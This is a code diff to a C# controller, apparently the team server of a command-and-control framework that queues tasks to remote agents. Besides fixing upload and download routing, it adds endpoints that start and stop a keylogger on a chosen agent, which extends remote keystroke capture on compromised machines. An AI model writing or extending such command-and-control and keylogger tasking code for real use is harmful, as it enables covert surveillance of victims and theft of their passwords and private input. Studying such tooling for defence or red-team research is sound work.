@@ -106,7 +106,7 @@ namespace TeamServer.Controllers
         [HttpPost("{agentID}/execute/filedownload")]
         public async Task<IActionResult> QueueFileDownloadCommand([FromRoute] int agentID, DownloadDTO downloadDTO)
         {
-            var response = await this._commandService.QueueTaskAsync(agentID, TaskType.DOWNLOAD, TaskCode.DOWNLOAD, downloadDTO);
+            var response = await this._commandService.QueueDownloadTaskAsync(agentID, downloadDTO);
             return response.IsSuccess ? Created() : BadRequest(response.Error);
         }
 
@@ -122,7 +122,7 @@ namespace TeamServer.Controllers
         [HttpPost("{agentID}/execute/upload")]
         public async Task<IActionResult> QueueUploadCommand([FromRoute] int agentID, UploadDTO uploadDTO)
         {
-            var response = await this._commandService.QueueTaskAsync(agentID, TaskType.DOWNLOAD, TaskCode.CANCEL_DOWNLOAD, uploadDTO);
+            var response = await this._commandService.QueueTaskAsync(agentID, TaskType.UPLOAD, TaskCode.NO_CODE, uploadDTO);
             return response.IsSuccess ? Created() : BadRequest(response.Error);
         }
 
@@ -163,6 +163,20 @@ namespace TeamServer.Controllers
         public async Task<IActionResult> QueueGetUIDCommand([FromRoute] int agentID, GetUIDDTO getUIDDTO)
         {
             var response = await this._commandService.QueueTaskAsync(agentID, TaskType.GET_UID, TaskCode.NO_CODE, getUIDDTO);
+            return response.IsSuccess ? Created() : BadRequest(response.Error);
+        }
+        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+        [HttpPost("{agentID}/execute/startkeylogger")]
+        public async Task<IActionResult> QueueStartKeyloggerCommand([FromRoute] int agentID)
+        {
+            var response = await this._commandService.QueueTaskAsync(agentID, TaskType.KEYLOGGER, TaskCode.START_KEYLOGGER, new StartKeyloggerDTO());
+            return response.IsSuccess ? Created() : BadRequest(response.Error);
+        }
+        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+        [HttpPost("{agentID}/execute/stopkeylogger")]
+        public async Task<IActionResult> QueueStopKeyloggerCommand([FromRoute] int agentID)
+        {
+            var response = await this._commandService.QueueTaskAsync(agentID, TaskType.KEYLOGGER, TaskCode.STOP_KEYLOGGER, new StartKeyloggerDTO());
             return response.IsSuccess ? Created() : BadRequest(response.Error);
         }
     }
